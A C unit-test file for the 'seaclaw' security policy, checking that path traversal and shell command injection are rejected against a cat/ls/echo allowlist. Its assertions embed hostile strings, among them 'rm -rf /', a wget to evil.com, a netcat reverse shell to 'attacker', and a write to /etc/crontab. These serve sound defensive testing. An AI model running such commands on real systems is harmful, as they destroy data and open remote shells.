/* Adversarial security tests - path traversal, command injection, edge cases. */
#include "test_framework.h"
#include "seaclaw/security.h"
#include "seaclaw/core/allocator.h"
#include "seaclaw/core/error.h"
#include <string.h>
#include <stdlib.h>

static const char *allowed[] = { "cat", "ls", "echo" };
static const size_t allowed_len = 3;

static void test_path_traversal_unix(void) {
    sc_security_policy_t policy = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .workspace_dir = "/tmp/workspace",
        .allowed_paths = (const char *[]){ "/tmp/workspace" },
        .allowed_paths_count = 1,
    };
    SC_ASSERT_FALSE(sc_security_path_allowed(&policy, "../../etc/passwd", 16));
    SC_ASSERT_FALSE(sc_security_path_allowed(&policy, "/etc/passwd", 11));
}

static void test_path_traversal_windows(void) {
    sc_security_policy_t policy = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_paths = (const char *[]){ "C:\\workspace" },
        .allowed_paths_count = 1,
    };
    SC_ASSERT_FALSE(sc_security_path_allowed(&policy, "..\\..\\windows\\system32", 22));
}

static void test_command_injection_semicolon(void) {
    sc_security_policy_t p = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "ls; rm -rf /"));
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "cat x; wget http://evil.com"));
}

static void test_command_injection_pipe(void) {
    sc_security_policy_t p = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "cat file | nc -e /bin/sh attacker 4444"));
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "ls | tee /etc/crontab"));
}

static void test_command_injection_backticks(void) {
    sc_security_policy_t p = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "echo `whoami`"));
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "ls $(rm -rf /)"));
}

static void test_command_injection_subshell(void) {
    sc_security_policy_t p = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "echo $(id)"));
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "cat ${PATH}"));
}

static void test_command_very_long(void) {
    char buf[5000];
    memset(buf, 'a', 4095);
    buf[4095] = '\0';
    memcpy(buf + 4095, " ls", 4);
    sc_security_policy_t p = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, buf));
}

static void test_command_unicode(void) {
    sc_security_policy_t p = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    SC_ASSERT_TRUE(sc_policy_is_command_allowed(&p, "cat file.txt"));
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, "cat file | wget http://evil.com"));
}

static void test_command_null_byte(void) {
    char buf[] = "ls\x00; rm -rf /";
    sc_security_policy_t p = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    SC_ASSERT_TRUE(sc_policy_is_command_allowed(&p, buf));
}

static void test_rate_limit_exhaustion(void) {
    sc_allocator_t alloc = sc_system_allocator();
    sc_rate_tracker_t *t = sc_rate_tracker_create(&alloc, 3);
    SC_ASSERT_NOT_NULL(t);
    SC_ASSERT_TRUE(sc_rate_tracker_record_action(t));
    SC_ASSERT_TRUE(sc_rate_tracker_record_action(t));
    SC_ASSERT_TRUE(sc_rate_tracker_record_action(t));
    SC_ASSERT_FALSE(sc_rate_tracker_record_action(t));
    SC_ASSERT_TRUE(sc_rate_tracker_is_limited(t));
    sc_rate_tracker_destroy(t);
}

static void test_policy_null_inputs(void) {
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(NULL, "ls"));
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(NULL, NULL));
}

static void test_policy_empty_command(void) {
    sc_security_policy_t p = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    SC_ASSERT_FALSE(sc_policy_is_command_allowed(&p, ""));
}

static void test_policy_validate_null_command(void) {
    sc_security_policy_t p = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_commands = allowed,
        .allowed_commands_len = allowed_len,
    };
    sc_command_risk_level_t risk;
    sc_error_t err = sc_policy_validate_command(&p, NULL, false, &risk);
    SC_ASSERT_EQ(err, SC_ERR_INVALID_ARGUMENT);
}

static void test_path_allowed_null_policy(void) {
    SC_ASSERT_FALSE(sc_security_path_allowed(NULL, "/tmp/file", 9));
}

static void test_path_allowed_no_allowlist(void) {
    sc_security_policy_t policy = {
        .autonomy = SC_AUTONOMY_SUPERVISED,
        .allowed_paths = NULL,
        .allowed_paths_count = 0,
    };
    /* Default-deny: empty allowlist means no path is allowed */
    SC_ASSERT_FALSE(sc_security_path_allowed(&policy, "/any/path", 9));
}

void run_adversarial_tests(void) {
    SC_TEST_SUITE("Adversarial - Path traversal");
    SC_RUN_TEST(test_path_traversal_unix);
    SC_RUN_TEST(test_path_traversal_windows);
    SC_RUN_TEST(test_path_allowed_null_policy);
    SC_RUN_TEST(test_path_allowed_no_allowlist);

    SC_TEST_SUITE("Adversarial - Command injection");
    SC_RUN_TEST(test_command_injection_semicolon);
    SC_RUN_TEST(test_command_injection_pipe);
    SC_RUN_TEST(test_command_injection_backticks);
    SC_RUN_TEST(test_command_injection_subshell);

    SC_TEST_SUITE("Adversarial - Edge cases");
    SC_RUN_TEST(test_command_very_long);
    SC_RUN_TEST(test_command_unicode);
    SC_RUN_TEST(test_command_null_byte);
    SC_RUN_TEST(test_rate_limit_exhaustion);
    SC_RUN_TEST(test_policy_null_inputs);
    SC_RUN_TEST(test_policy_empty_command);
    SC_RUN_TEST(test_policy_validate_null_command);
}
